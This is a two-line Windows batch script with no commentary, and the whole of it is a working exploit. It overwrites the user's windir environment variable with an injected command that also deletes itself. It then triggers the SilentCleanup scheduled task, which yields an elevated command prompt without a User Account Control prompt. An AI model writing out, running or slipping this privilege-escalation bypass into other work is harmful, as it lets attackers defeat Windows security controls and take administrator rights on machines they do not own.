@reg add hkcu\Environment /v windir /d "cmd /c reg delete hkcu\Environment /v windir /f & start \"\" cmd /k @cls||" /f
@schtasks/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I